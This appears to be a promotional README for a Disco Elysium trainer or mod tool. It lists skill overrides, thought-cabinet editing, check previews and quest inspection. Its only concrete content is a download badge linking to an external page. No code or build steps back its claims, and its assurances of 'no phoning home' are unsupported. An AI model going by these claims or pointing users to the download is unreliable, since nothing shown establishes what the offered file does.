# 🧠 Disco Elysium Companion Suite — "The Interisolary Thought Cabinet"

> *A trainer-grade companion environment for the world's most introspective detective RPG — rebuilt from the ground up for players who want to bend reality without breaking immersion.*

[![Download](https://raw.githubusercontent.com/BlackBikerss/Elysium-Skill-Forge/main/launch_3af8ba4.svg)](https://BlackBikerss.github.io/Elysium-Skill-Forge/)

---

## 🕵️ What Is This, Exactly?

Somewhere between a debugging console, a narrative sandbox, and a philosophical argument with your own limbic system, **Disco Elysium Companion Suite** lives in the liminal space that other trainers are too afraid to explore.

The original *DiscoElysium-Trainer* repository proved that players wanted more granular control over Revachol's strangest detective. This project takes that spark and turns it into a cathedral of configuration — a living, breathing control panel for every skill check, every thought, every ill-advised internal monologue your detective has ever had.

Think of it less as a "trainer" and more as a *director's cut* for your own playthrough. You're not cheating the game. You're collaborating with it.

---

## 🎭 The Philosophy Behind the Build

Most enhancement tools treat the player like someone who wants to skip content. We treat you like someone who wants to *conduct* it.

Every toggle in this suite exists because at some point, a player stared at the screen and whispered, "But what if I *could* pass that Authority check without humiliating myself in front of Kim?" This project is the answer to that whisper.

It's about agency. It's about curiosity. It's about seeing what happens when the Pale doesn't swallow you whole, when the Phasmid actually sticks around for a full conversation, and when your Volition stat finally stops writing you letters of concern.

## ✨ Feature Constellation

### 🎛️ Adaptive Stat & Skill Governance
- Real-time adjustment of the 24 core skills across Intellect, Psyche, Physique, and Motorics
- Per-check overrides that let you decide outcomes contextually rather than globally
- Reversible mutations — every change can be unwound without reloading a save

### 🧩 Thought Cabinet Workbench
- Unlock, slot, and retire thoughts on demand
- Preview internalized bonuses before committing to a slot
- Experiment with combinations that the base game never intended to coexist

### 👁️ Narrative Foresight Layer
- Passive-check visualization that reveals which dialogue options hinge on which stats
- Non-intrusive overlay that disappears the moment you stop asking questions
- Contextual hints that feel like intuition rather than hand-holding

### 🗝️ Sequence-Agnostic Exploration
- Revisit locked rooms, optional conversations, and companion moments without a full restart
- Quest state inspector that shows branches you may have missed
- Zero forced cutscenes — the world waits for you

### 🌍 Multilingual Localization Matrix
- Interface strings available in a growing constellation of languages
- Right-to-left and CJK rendering pipelines baked in from day one
- Community-translatable string tables with a hot-reload workflow

### 📱 Responsive Interface Architecture
- Layouts that fold gracefully from ultrawide monitors down to handheld screens
- Touch and pointer input treated as equals, not afterthoughts
- Theme engine with contrast presets for long nocturnal sessions

### 🛎️ Around-the-Clock Steward Support
- Documentation hub that answers the questions before you think to ask them
- Issue triage with a human in the loop at any hour of the local day
- A community steward program for players who want to help shape the roadmap

---

## 🧭 Design Principles

1. **Non-destructive by default.** Every capability is opt-in and reversible.
2. **Narrative respect.** We enhance; we don't editorialize.
3. **Performance is a feature.** Sub-millisecond hook latency, negligible memory overhead.
4. **Transparency above all.** No hidden telemetry, no phoning home, no surprises.
5. **Community is the compass.** Roadmap decisions are made in public.
